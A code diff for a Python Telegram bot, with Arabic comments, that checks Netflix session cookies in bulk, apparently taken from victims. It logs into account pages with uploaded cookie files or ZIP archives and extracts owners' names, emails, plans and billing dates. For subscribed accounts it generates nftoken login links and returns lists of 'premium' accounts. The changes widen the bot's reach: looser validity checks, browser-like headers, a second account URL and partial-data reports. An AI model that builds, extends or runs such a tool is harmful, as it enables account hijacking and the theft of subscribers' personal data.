@@ -273,6 +273,7 @@ def is_netflix_cookie_entry(domain, name):
 def has_required_netflix_cookies(cookie_dict):
     if not isinstance(cookie_dict, dict):
         return False
+    # حتى لو مش معاه SecureNetflixId، نحاول نشتغل
     return bool(cookie_dict.get("NetflixId"))
 
 def convert_json_to_netscape(json_data):
@@ -430,23 +431,29 @@ def cookies_dict_from_netscape(netscape_text):
     return cookies
 
 
-# ==================== ACCOUNT INFO EXTRACTION ====================
+# ==================== ACCOUNT INFO EXTRACTION - IMPROVED FOR TXT FILES ====================
 
 def extract_profile_names(response_text):
     names = []
-    for pattern in [r'"profileName"\s*:\s*"([^"]+)"']:
+    for pattern in [r'"profileName"\s*:\s*"([^"]+)"', r'"name":"([^"]+)"', r'"profileName":"([^"]+)"']:
         for match in re.finditer(pattern, response_text):
             name = decode_netflix_value(match.group(1))
-            if name and name not in names:
+            if name and name not in names and len(name) < 50:
                 names.append(name)
-    return ", ".join(names) if names else None
+    return ", ".join(names[:10]) if names else None
 
 def extract_info_from_graphql_payload(response_text):
     try:
-        data = json.loads(response_text).get("data", {})
+        # البحث عن GraphQL payload
+        graphql_match = re.search(r'\{[\s\S]*?"growthAccount"[\s\S]*?\}', response_text)
+        if not graphql_match:
+            return {}
+        
+        data = json.loads(graphql_match.group(0))
         ga = data.get("growthAccount", {})
         cp = data.get("currentProfile", {})
         cur_plan = ga.get("currentPlan", {}).get("plan", {})
+        
         info = {
             "accountOwnerName": decode_netflix_value(cp.get("name")),
             "countryOfSignup": decode_netflix_value(ga.get("countryOfSignUp", {}).get("code")),
@@ -458,47 +465,61 @@ def extract_info_from_graphql_payload(response_text):
             "planPrice": decode_netflix_value(cur_plan.get("priceDisplay")),
             "videoQuality": decode_netflix_value(cur_plan.get("videoQuality")),
             "maxStreams": cur_plan.get("maxStreams"),
-            "profiles": None,
         }
-        profiles = ga.get("profiles", [])
-        profile_names = [decode_netflix_value(p.get("name")) for p in profiles if p.get("name")]
-        if profile_names:
-            info["profiles"] = ", ".join(profile_names)
         return {k: v for k, v in info.items() if v}
     except:
         return {}
 
-def has_complete_account_info(info):
+def extract_info_fallback(response_text):
+    """استخراج المعلومات من HTML العادي (لما GraphQL مش موجود)"""
+    info = {}
+    
+    # Extraction patterns للمعلومات الأساسية
+    patterns = {
+        "accountOwnerName": [r'"name":"([^"]+)"', r'"accountOwnerName":"([^"]+)"', r'"userName":"([^"]+)"'],
+        "countryOfSignup": [r'"currentCountry":"([^"]+)"', r'"country":"([^"]+)"', r'"countryOfSignup":"([^"]+)"'],
+        "memberSince": [r'"memberSince":"([^"]+)"', r'"joinDate":"([^"]+)"'],
+        "nextBillingDate": [r'"nextBillingDate":"([^"]+)"', r'"billingDate":"([^"]+)"'],
+        "userGuid": [r'"userGuid":"([^"]+)"', r'"guid":"([^"]+)"'],
+        "membershipStatus": [r'"membershipStatus":"([^"]+)"', r'"status":"([^"]+)"'],
+        "maxStreams": [r'"maxStreams":(\d+)', r'"streams":(\d+)'],
+        "localizedPlanName": [r'"planName":"([^"]+)"', r'"localizedPlanName":"([^"]+)"', r'"plan":"([^"]+)"'],
+        "planPrice": [r'"planPrice":"([^"]+)"', r'"price":"([^"]+)"', r'"formattedPlanPrice":"([^"]+)"'],
+        "videoQuality": [r'"videoQuality":"([^"]+)"', r'"quality":"([^"]+)"'],
+        "email": [r'"email":"([^"]+)"', r'"loginId":"([^"]+)"', r'"emailAddress":"([^"]+)"'],
+    }
+    
+    for key, pattern_list in patterns.items():
+        for pattern in pattern_list:
+            value = extract_first_match(response_text, [pattern])
+            if value:
+                info[key] = value
+                break
+    
+    return info
+
+def has_any_account_info(info):
+    """تأكد إن فيه أي معلومة على الأقل"""
     if not info:
         return False
-    required = ("countryOfSignup", "membershipStatus", "localizedPlanName")
-    return all(info.get(f) for f in required)
-
-def merge_info(primary, fallback):
-    merged = dict(fallback or {})
-    for k, v in (primary or {}).items():
-        if v not in (None, "", [], {}):
-            merged[k] = v
-    return merged
+    important_fields = ["countryOfSignup", "membershipStatus", "localizedPlanName", "accountOwnerName"]
+    return any(info.get(f) for f in important_fields)
 
 def extract_info(response_text):
+    # First try to get GraphQL data
     graphql_info = extract_info_from_graphql_payload(response_text)
-    if has_complete_account_info(graphql_info):
+    if has_any_account_info(graphql_info):
         return graphql_info
-    extracted = {
-        "accountOwnerName": extract_first_match(response_text, [r'"name":"([^"]+)"', r'"accountOwnerName":"([^"]+)"']),
-        "countryOfSignup": extract_first_match(response_text, [r'"currentCountry":"([^"]+)"', r'"countryOfSignup":"([^"]+)"']),
-        "memberSince": extract_first_match(response_text, [r'"memberSince":"([^"]+)"']),
-        "nextBillingDate": extract_first_match(response_text, [r'"nextBillingDate":"([^"]+)"']),
-        "userGuid": extract_first_match(response_text, [r'"userGuid":"([^"]+)"']),
-        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":"([^"]+)"']),
-        "maxStreams": extract_first_match(response_text, [r'"maxStreams":(\d+)']),
-        "localizedPlanName": extract_first_match(response_text, [r'"localizedPlanName":"([^"]+)"', r'"planName":"([^"]+)"']),
-        "planPrice": extract_first_match(response_text, [r'"planPrice":"([^"]+)"', r'"formattedPlanPrice":"([^"]+)"']),
-        "videoQuality": extract_first_match(response_text, [r'"videoQuality":"([^"]+)"']),
-        "profiles": extract_profile_names(response_text),
-    }
-    return merge_info(graphql_info, extracted)
+    
+    # If no GraphQL, try fallback extraction from HTML
+    fallback_info = extract_info_fallback(response_text)
+    
+    # Also extract profiles
+    profiles = extract_profile_names(response_text)
+    if profiles:
+        fallback_info["profiles"] = profiles
+    
+    return fallback_info
 
 def normalize_plan_key(plan_name):
     if not plan_name:
@@ -534,10 +555,13 @@ def derive_plan_info(info, is_subscribed):
 
 def is_subscribed_account(info):
     status = normalize_plan_key(info.get("membershipStatus"))
-    return status == "current_member"
+    # Check for any active membership indicators
+    active_statuses = ["current_member", "active", "current", "cancelled", "past_due"]
+    return status in active_statuses or "member" in status
 
 def is_extra_member_account(info):
-    return "extra" in str(info.get("localizedPlanName", "")).lower()
+    plan = str(info.get("localizedPlanName", "")).lower()
+    return "extra" in plan or "miembro extra" in plan
 
 def format_display_date(value):
     cleaned = decode_netflix_value(value)
@@ -616,11 +640,33 @@ def build_nftoken_links(token, mode):
     ]
 
 def get_account_page(session, proxy=None, timeout=15):
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
-    resp = session.get("https://www.netflix.com/YourAccount", headers=headers, timeout=timeout)
-    if resp.status_code == 200:
-        return resp.text, resp.status_code, extract_info(resp.text)
-    return resp.text, resp.status_code, None
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+    }
+    # Try both URLs for better data extraction
+    urls = [
+        "https://www.netflix.com/YourAccount",
+        "https://www.netflix.com/account/membership"
+    ]
+    
+    for url in urls:
+        try:
+            resp = session.get(url, headers=headers, timeout=timeout)
+            if resp.status_code == 200:
+                info = extract_info(resp.text)
+                if has_any_account_info(info):
+                    return resp.text, resp.status_code, info
+        except:
+            continue
+    
+    # Fallback to first URL
+    resp = session.get(urls[0], headers=headers, timeout=timeout)
+    return resp.text, resp.status_code, extract_info(resp.text)
 
 
 # ==================== RESULT FORMATTING ====================
@@ -866,32 +912,57 @@ async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await msg.edit_text("🔄 Connecting to Netflix...")
     session = requests.Session()
     session.cookies.update(cookies)
-    resp, code, info = get_account_page(session, None, 15)
+    response_text, status_code, info = get_account_page(session, None, 15)
     
-    if code == 200 and info and info.get("countryOfSignup"):
-        is_sub = is_subscribed_account(info)
-        config, _ = load_config()
-        nftoken = None
-        if get_nftoken_mode(config) != "false" and is_sub:
-            nftoken, _ = create_nftoken(cookies, 1)
-        
-        mode = context.user_data.get('mode', 'fullinfo')
-        if mode == 'tokenonly':
-            email = info.get("email", "Unknown")
-            res = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login: https://netflix.com/?nftoken={nftoken['token']}\nPhone Login: https://netflix.com/unsupported?nftoken={nftoken['token']}"
+    # Even if status is 200 but info is incomplete, show what we have
+    if status_code == 200:
+        if info and has_any_account_info(info):
+            is_sub = is_subscribed_account(info)
+            config, _ = load_config()
+            nftoken = None
+            if get_nftoken_mode(config) != "false" and is_sub:
+                nftoken, _ = create_nftoken(cookies, 1)
+            
+            mode = context.user_data.get('mode', 'fullinfo')
+            if mode == 'tokenonly':
+                email = info.get("email", "Unknown")
+                res = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login: https://netflix.com/?nftoken={nftoken['token']}\nPhone Login: https://netflix.com/unsupported?nftoken={nftoken['token']}"
+            else:
+                res = format_result_beautiful(info, is_sub, bundles[0].get("netscape_text", ""), fname, nftoken, config)
+            
+            await msg.delete()
+            buf = BytesIO()
+            buf.write(res.encode('utf-8'))
+            buf.seek(0)
+            typ = "Premium" if is_sub else "Free"
+            await update.message.reply_document(document=buf, filename=f"{typ}_{int(time.time())}.txt", caption="✅ Account Check Result")
+            stats['valid'] += 1 if is_sub else 0
+            stats['free'] += 0 if is_sub else 1
         else:
-            res = format_result_beautiful(info, is_sub, bundles[0].get("netscape_text", ""), fname, nftoken, config)
-        
-        await msg.delete()
-        buf = BytesIO()
-        buf.write(res.encode('utf-8'))
-        buf.seek(0)
-        typ = "Premium" if is_sub else "Free"
-        await update.message.reply_document(document=buf, filename=f"{typ}_{int(time.time())}.txt", caption="✅ Account Check Result")
-        stats['valid'] += 1 if is_sub else 0
-        stats['free'] += 0 if is_sub else 1
+            # Partial data or incomplete response - show what we could extract
+            partial_info = extract_info_fallback(response_text)
+            if partial_info and has_any_account_info(partial_info):
+                is_sub = is_subscribed_account(partial_info)
+                result = f"""⚠️ Partial Data Only
+
+Status: {'Active' if is_sub else 'Free/Inactive'}
+Country: {partial_info.get('countryOfSignup', 'Unknown')}
+Plan: {partial_info.get('localizedPlanName', 'Unknown')}
+Membership: {partial_info.get('membershipStatus', 'Unknown')}
+
+ℹ️ Limited data available. For complete details, export cookies as JSON format with SecureNetflixId.
+"""
+                buf = BytesIO()
+                buf.write(result.encode('utf-8'))
+                buf.seek(0)
+                await update.message.reply_document(document=buf, filename=f"partial_{int(time.time())}.txt", caption="⚠️ Partial Data - Limited Information")
+                stats['valid'] += 1 if is_sub else 0
+                stats['free'] += 0 if is_sub else 1
+            else:
+                await msg.edit_text(f"❌ Could not extract account data. Status: HTTP {status_code}")
+                stats['failed'] += 1
     else:
-        await msg.edit_text(f"❌ Failed: HTTP {code}")
+        await msg.edit_text(f"❌ Failed: HTTP {status_code}")
         stats['failed'] += 1
     
     stats['total'] += 1
@@ -916,6 +987,7 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await file.download_to_memory(zip_data)
     
     premium_accounts = []
+    partial_accounts = []
     free_count = 0
     invalid_count = 0
     total_files = 0
@@ -960,8 +1032,9 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         if has_required_netflix_cookies(cookies):
                             sess = requests.Session()
                             sess.cookies.update(cookies)
-                            resp, code, info = get_account_page(sess, None, 15)
-                            if code == 200 and info and info.get("countryOfSignup"):
+                            response_text, status_code, info = get_account_page(sess, None, 15)
+                            
+                            if status_code == 200 and info and has_any_account_info(info):
                                 is_sub = is_subscribed_account(info)
                                 if is_sub:
                                     nftoken = None
@@ -979,8 +1052,26 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                     free_count += 1
                                     stats['free'] += 1
                             else:
-                                invalid_count += 1
-                                stats['failed'] += 1
+                                # Try to get partial data
+                                partial_info = extract_info_fallback(response_text) if response_text else {}
+                                if partial_info and has_any_account_info(partial_info):
+                                    is_sub = is_subscribed_account(partial_info)
+                                    partial_res = f"""⚠️ Partial Data - {cf}
+
+Status: {'Active' if is_sub else 'Free/Inactive'}
+Country: {partial_info.get('countryOfSignup', 'Unknown')}
+Plan: {partial_info.get('localizedPlanName', 'Unknown')}
+Membership: {partial_info.get('membershipStatus', 'Unknown')}
+
+ℹ️ Limited data. For full details, use JSON format cookies.
+"""
+                                    partial_accounts.append(partial_res)
+                                    partial_accounts.append("\n" + "="*65 + "\n")
+                                    stats['free'] += 1 if not is_sub else 0
+                                    stats['valid'] += 1 if is_sub else 0
+                                else:
+                                    invalid_count += 1
+                                    stats['failed'] += 1
                         else:
                             invalid_count += 1
                             stats['failed'] += 1
@@ -1000,6 +1091,7 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             elapsed = time.time() - start
             pc = len([r for r in premium_accounts if r.startswith(("=", "STATUS:", "Account:"))])
             spd = total_files / elapsed if elapsed > 0 else 0
+            partial_count = len([r for r in partial_accounts if r.startswith(("⚠️", "="))]) // 2 if partial_accounts else 0
             
             final = f"""
 ✅ Processing Complete
@@ -1011,6 +1103,7 @@ Total Files: {total_files}
 Valid Accounts: {pc}
 Premium Accounts: {pc}
 Free Accounts: {free_count}
+Partial Data: {partial_count}
 Invalid Accounts: {invalid_count}
 
 Time Taken: {elapsed:.2f} seconds
@@ -1019,14 +1112,20 @@ Speed: {spd:.2f} accounts/second
 """
             await msg.delete()
             await update.message.reply_text(final)
+            
             if premium_accounts:
                 all_res = "".join(premium_accounts)
                 buf = BytesIO()
                 buf.write(all_res.encode('utf-8'))
                 buf.seek(0)
                 await update.message.reply_document(document=buf, filename="PREMIUM_ACCOUNTS.txt", caption=f"📄 {pc} Valid Premium Accounts Found")
-            else:
-                await update.message.reply_text("⚠️ No premium accounts found")
+            
+            if partial_accounts:
+                all_partial = "".join(partial_accounts)
+                buf2 = BytesIO()
+                buf2.write(all_partial.encode('utf-8'))
+                buf2.seek(0)
+                await update.message.reply_document(document=buf2, filename="PARTIAL_DATA.txt", caption=f"⚠️ {partial_count} Accounts with Limited Data")
         else:
             await msg.edit_text("⏹️ Task was cancelled")
             
